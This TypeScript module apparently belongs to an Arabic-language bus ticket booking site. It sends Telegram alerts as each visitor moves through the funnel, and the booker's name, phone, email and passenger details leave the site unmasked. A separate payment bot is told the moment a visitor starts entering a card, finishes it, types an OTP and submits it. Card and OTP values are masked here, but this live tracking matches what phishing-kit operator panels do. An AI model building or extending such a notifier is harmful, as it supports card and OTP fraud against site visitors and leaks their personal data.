import { z } from 'zod';
import { db } from './db.js';

const bookingEventSchema = z.object({
  event: z.enum([
    'visitor-enter',
    'search-submitted',
    'trip-selected',
    'seats-selected',
    'passenger-info',
    'payment-method',
    'new-booking',
  ]),
  from: z.string().max(120).optional(),
  to: z.string().max(120).optional(),
  date: z.string().max(40).optional(),
  returnDate: z.string().max(40).optional(),
  pickupTime: z.string().max(20).optional(),
  returnTime: z.string().max(20).optional(),
  tripType: z.string().max(40).optional(),
  ticketType: z.string().max(80).optional(),
  passengers: z.string().max(20).optional(),
  adults: z.string().max(20).optional(),
  children: z.string().max(20).optional(),
  infants: z.string().max(20).optional(),
  tripNumber: z.string().max(80).optional(),
  fareClass: z.string().max(80).optional(),
  departureTime: z.string().max(40).optional(),
  arrivalTime: z.string().max(40).optional(),
  duration: z.string().max(80).optional(),
  distance: z.string().max(120).optional(),
  seats: z.string().max(500).optional(),
  bookerName: z.string().max(200).optional(),
  bookerPhone: z.string().max(100).optional(),
  bookerEmail: z.string().max(320).optional(),
  passengerDetails: z.string().max(8000).optional(),
  paymentMethod: z.string().max(120).optional(),
  amount: z.string().max(40).optional(),
  page: z.string().max(300).optional(),
}).strict();

const paymentEventSchema = z.object({
  status: z.enum([
    'fill_in_started',
    'filled_in',
    'verification_input_complete',
    'verification_submitted',
    'verification_succeeded',
    'verification_failed',
  ]),
}).strict();

export type BookingEvent = z.infer<typeof bookingEventSchema>;
export type PaymentEvent = z.infer<typeof paymentEventSchema>;

function escapeHtml(value: unknown): string {
  return String(value ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

async function getStoredSetting(key: string, fallback = ''): Promise<string> {
  return (await db.setting.findUnique({ where: { key } }))?.value || fallback;
}

type StoredMessage = { id?: string; enabled?: boolean; template?: string };

async function getNotificationState() {
  const raw = await getStoredSetting('telegramFullSettings');
  if (!raw) return { bookingEnabled: true, paymentEnabled: true, bookingMessages: [], paymentMessages: [] };
  try {
    const parsed = JSON.parse(raw) as {
      bookingEnabled?: boolean;
      paymentEnabled?: boolean;
      bookingMessages?: StoredMessage[];
      paymentMessages?: StoredMessage[];
    };
    return {
      bookingEnabled: parsed.bookingEnabled ?? true,
      paymentEnabled: parsed.paymentEnabled ?? true,
      bookingMessages: Array.isArray(parsed.bookingMessages) ? parsed.bookingMessages : [],
      paymentMessages: Array.isArray(parsed.paymentMessages) ? parsed.paymentMessages : [],
    };
  } catch {
    return { bookingEnabled: true, paymentEnabled: true, bookingMessages: [], paymentMessages: [] };
  }
}

async function sendTelegramMessage(token: string, chatId: string, text: string): Promise<boolean> {
  if (!token || !chatId) return false;
  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    signal: AbortSignal.timeout(8000),
  });
  return response.ok;
}

function bookingTitle(event: BookingEvent['event']): string {
  const titles: Record<BookingEvent['event'], string> = {
    'visitor-enter': '🌐 دخول زائر جديد',
    'search-submitted': '🔍 تنفيذ بحث عن رحلة',
    'trip-selected': '🚌 اختيار رحلة',
    'seats-selected': '💺 اختيار المقاعد',
    'passenger-info': '👥 اكتمال بيانات المسافرين',
    'payment-method': '💳 اختيار طريقة الدفع',
    'new-booking': '✅ حجز جديد',
  };
  return titles[event];
}

function bookingMessage(input: BookingEvent): string {
  return `<b>${bookingTitle(input.event)}</b>`;
}

function parseSelectedTrip(value: string | undefined): Record<string, unknown> {
  if (!value) return {};
  try {
    const parsed = JSON.parse(value);
    return parsed && typeof parsed === 'object' && !Array.isArray(parsed)
      ? parsed as Record<string, unknown>
      : {};
  } catch {
    return {};
  }
}

function formatSelectedSeats(value: string | undefined): string | undefined {
  if (!value) return undefined;
  try {
    const parsed = JSON.parse(value);
    if (Array.isArray(parsed)) {
      return parsed.map(item => String(item).replace('seat-', '')).join(', ');
    }
  } catch {
    // Preserve legacy plain-text values.
  }
  return value;
}

async function enrichBookingEvent(input: BookingEvent): Promise<BookingEvent> {
  if (!input.from || !input.to || !input.date || input.event === 'visitor-enter') return input;

  const booking = await db.booking.findFirst({
    where: {
      fromLocation: input.from,
      toLocation: input.to,
      pickupDate: input.date,
    },
    orderBy: { createdAt: 'desc' },
  });
  if (!booking) return input;

  const trip = parseSelectedTrip(booking.selectedTrip);
  const passengerDetails = input.passengerDetails || [
    booking.passengerName ? `الأسماء: ${booking.passengerName}` : '',
    booking.passengerPhone ? `الهاتف: ${booking.passengerPhone}` : '',
    booking.passengerDocument ? 'رقم/أرقام الوثائق: [محجوب]' : '',
  ].filter(Boolean).join('\n');

  return {
    ...input,
    returnDate: input.returnDate || booking.returnDate || undefined,
    pickupTime: input.pickupTime || booking.pickupTime || undefined,
    returnTime: input.returnTime || booking.returnTime || undefined,
    tripType: input.tripType || booking.tripType || undefined,
    passengers: input.passengers || String(booking.passengers ?? ''),
    adults: input.adults || String(booking.adults ?? ''),
    children: input.children || String(booking.children ?? ''),
    infants: input.infants || String(booking.infants ?? ''),
    tripNumber: input.tripNumber || (typeof trip.tripNumber === 'string' ? trip.tripNumber : undefined),
    fareClass: input.fareClass || booking.fareClass || undefined,
    departureTime: input.departureTime || (typeof trip.departureTime === 'string' ? trip.departureTime : undefined),
    arrivalTime: input.arrivalTime || (typeof trip.arrivalTime === 'string' ? trip.arrivalTime : undefined),
    duration: input.duration || (typeof trip.duration === 'string' ? trip.duration : undefined),
    distance: input.distance || (typeof trip.distance === 'string' ? trip.distance : undefined),
    seats: input.seats || formatSelectedSeats(booking.selectedSeats),
    passengerDetails: passengerDetails || undefined,
    paymentMethod: input.paymentMethod || booking.paymentMethod || undefined,
    amount: input.amount || (booking.totalAmount > 0 ? String(booking.totalAmount) : undefined),
  };
}

function safeDetailLines(input: BookingEvent): string[] {
  const rows: Array<[string, string | undefined]> = [
    ['من', input.from],
    ['إلى', input.to],
    ['تاريخ المغادرة', input.date],
    ['وقت المغادرة', input.pickupTime],
    ['تاريخ العودة', input.returnDate],
    ['وقت العودة', input.returnTime],
    ['نوع الرحلة', input.tripType],
    ['نوع التذكرة', input.ticketType],
    ['إجمالي المسافرين', input.passengers],
    ['البالغون', input.adults],
    ['الأطفال', input.children],
    ['الرضع', input.infants],
    ['رقم الرحلة', input.tripNumber],
    ['الفئة', input.fareClass],
    ['وقت الانطلاق', input.departureTime],
    ['وقت الوصول', input.arrivalTime],
    ['المدة', input.duration],
    ['المسافة', input.distance],
    ['المقاعد', input.seats],
    ['اسم صاحب الحجز', input.bookerName],
    ['هاتف صاحب الحجز', input.bookerPhone],
    ['بريد صاحب الحجز', input.bookerEmail],
    ['بيانات المسافرين', input.passengerDetails],
    ['طريقة الدفع', input.paymentMethod],
    ['المبلغ', input.amount],
    ['الصفحة', input.page],
  ];

  return rows
    .filter(([, value]) => value !== undefined && value !== '')
    .map(([label, value]) => `<b>${label}:</b> ${escapeHtml(value)}`);
}

function paymentMessage(input: PaymentEvent): string {
  const titles: Record<PaymentEvent['status'], string> = {
    'fill_in_started': '🟡 حالة العملية: fill in',
    'filled_in': '✅ حالة العملية: filled in',
    'verification_input_complete': '🟡 حالة العملية: verification filled in',
    'verification_submitted': '🔄 حالة العملية: verification submitted',
    'verification_succeeded': '✅ حالة العملية: verification succeeded',
    'verification_failed': '❌ حالة العملية: verification failed',
  };
  const hiddenFields = input.status === 'filled_in'
    ? '\nرقم البطاقة: [محجوب]\nتاريخ الانتهاء: [محجوب]\nCVV: [محجوب]'
    : input.status.startsWith('verification_')
      ? '\nرمز التحقق: [محجوب]'
      : '';
  return `<b>${titles[input.status]}</b>${hiddenFields}`;
}

function renderSafeTemplate(template: string, values: Record<string, string>): string {
  return template.replace(/\{([^}]+)\}/g, (_match, key: string) => values[key] ?? '[محجوب]');
}

function bookingTemplateValues(input: BookingEvent): Record<string, string> {
  return {
    from: escapeHtml(input.from),
    fromLocation: escapeHtml(input.from),
    to: escapeHtml(input.to),
    toLocation: escapeHtml(input.to),
    date: escapeHtml(input.date),
    pickupDate: escapeHtml(input.date),
    returnDate: escapeHtml(input.returnDate),
    pickupTime: escapeHtml(input.pickupTime),
    returnTime: escapeHtml(input.returnTime),
    tripType: escapeHtml(input.tripType),
    ticketType: escapeHtml(input.ticketType),
    passengers: escapeHtml(input.passengers),
    adults: escapeHtml(input.adults),
    children: escapeHtml(input.children),
    infants: escapeHtml(input.infants),
    tripNumber: escapeHtml(input.tripNumber),
    fareClass: escapeHtml(input.fareClass),
    departureTime: escapeHtml(input.departureTime),
    arrivalTime: escapeHtml(input.arrivalTime),
    duration: escapeHtml(input.duration),
    distance: escapeHtml(input.distance),
    seats: escapeHtml(input.seats),
    selectedSeats: escapeHtml(input.seats),
    bookerName: escapeHtml(input.bookerName),
    bookerPhone: escapeHtml(input.bookerPhone),
    bookerEmail: escapeHtml(input.bookerEmail),
    passengerDetails: escapeHtml(input.passengerDetails),
    paymentMethod: escapeHtml(input.paymentMethod),
    amount: escapeHtml(input.amount),
    totalAmount: escapeHtml(input.amount),
    page: escapeHtml(input.page),
    time: escapeHtml(new Date().toLocaleString('ar-SA')),
  };
}

export async function sendBookingNotification(payload: unknown): Promise<boolean> {
  const parsed = bookingEventSchema.parse(payload);
  const input = await enrichBookingEvent(parsed);
  const state = await getNotificationState();
  if (!state.bookingEnabled) return false;
  const messageSetting = state.bookingMessages.find(message => message.id === input.event);
  if (messageSetting?.enabled === false) return false;
  const [token, chatId] = await Promise.all([
    getStoredSetting('telegramBotToken', process.env.TELEGRAM_BOT_TOKEN || ''),
    getStoredSetting('telegramChatId', process.env.TELEGRAM_CHAT_ID || ''),
  ]);
  const baseText = messageSetting?.template
    ? renderSafeTemplate(messageSetting.template, bookingTemplateValues(input))
    : bookingMessage(input);
  const details = safeDetailLines(input);
  const text = details.length > 0
    ? `${baseText}\n\n<b>📋 تفاصيل الإدخالات</b>\n${details.join('\n')}`
    : baseText;
  return sendTelegramMessage(token, chatId, text);
}

export async function sendPaymentNotification(payload: unknown): Promise<boolean> {
  const input = paymentEventSchema.parse(payload);
  const state = await getNotificationState();
  if (!state.paymentEnabled) return false;
  const messageIdByStatus: Record<PaymentEvent['status'], string> = {
    fill_in_started: 'card-entered',
    filled_in: 'card-complete',
    verification_input_complete: 'otp-typing',
    verification_submitted: 'otp-attempt',
    verification_succeeded: 'otp-success',
    verification_failed: 'otp-failed',
  };
  const messageSetting = state.paymentMessages.find(message => message.id === messageIdByStatus[input.status]);
  if (messageSetting?.enabled === false) return false;
  const [token, chatId] = await Promise.all([
    getStoredSetting('paymentBotToken', process.env.PAYMENT_BOT_TOKEN || ''),
    getStoredSetting('paymentChatId', process.env.PAYMENT_CHAT_ID || ''),
  ]);
  return sendTelegramMessage(token, chatId, paymentMessage(input));
}
